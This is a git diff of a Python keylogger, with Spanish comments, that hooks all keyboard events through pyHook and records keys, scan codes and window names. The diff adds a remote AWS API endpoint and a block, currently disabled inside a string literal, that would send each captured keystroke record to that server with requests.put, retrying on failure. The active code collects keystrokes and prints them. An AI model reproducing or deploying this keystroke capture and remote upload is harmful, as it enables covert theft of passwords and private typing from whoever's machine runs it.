@@ -2,12 +2,21 @@
     Autor: @SergioRAlvarezP
     Fecha de Inicio: 2019-05-21
     Fecha de término: 2019-06-26
+    Fecha de Actualización: 2019-08-27
 '''
 from collections import deque
-import pyHook, pythoncom, sys, logging
+import pyHook, pythoncom, sys, logging, requests
 import time, datetime
+import requests
+from requests.exceptions import HTTPError
 
 i=0
+
+'''**CONFIGURACIÓN DEL REQUEST**'''
+name="prueba2"
+base_url = "https://ed2ku4egij.execute-api.us-west-1.amazonaws.com/Prod/"
+endpoint = '{0}evento/{1}'.format(base_url,name)
+'''***CONFIGURACIÓN DEL REQUEST***'''
 
 class Queue(object):
     def __init__(self):
@@ -43,10 +52,40 @@ def OnKeyboardEvent(event):
         i=elements.qlen()
         while i>0:
             value = elements.qpop()
+            '''contenido = {
+                'MessageName'   :   value[0],
+                'Message'       :   value[1],
+                'Time'          :   value[2],
+                'Window'        :   value[3],
+                'WindowName'    :   value[4],
+                'ASCII'         :   value[5],
+                'Key'           :   value[6],
+                'KeyID'         :   value[7],
+                'ScanCode'      :   value[8],
+                'Extended'      :   value[9],
+                'Injected'      :   value[10],
+                'Alt'           :   value[11],
+                'Transition'    :   value[12]
+            }
+
+            try:
+                res = requests.put(endpoint,json=contenido)
+                res.raise_for_status()
+            except HTTPError as http_err:
+                print(f'Error HTTP: {http_err}')
+                elements.qpush(value)
+            except Exception as err:
+                print(f'Error: {err}')
+                elements.qpush(value)
+            else:
+                print('Correcto')
+                i-=1
+            '''
             item = value[6]
             string = string + item
             i-=1
         print ('########################',string)
+            
     return True
 
 elements = Queue()
